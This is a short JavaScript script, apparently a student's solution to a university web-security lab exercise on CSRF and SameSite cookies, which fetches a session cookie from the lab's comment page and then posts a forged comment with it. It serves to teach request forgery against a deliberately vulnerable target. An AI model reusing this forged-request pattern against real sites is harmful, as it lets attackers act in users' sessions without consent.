const url = "https://webappsec.cs.ut.ee/csrf/comments_samesite.php";
const commentToAdd = "FinalRemoteAttack";

const main = async () => {
    const cookie = await fetch(url).then((response) => {
        return response.headers.get("set-cookie");
    });

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': cookie
        },
        body: "comment="+commentToAdd
    });
};

main();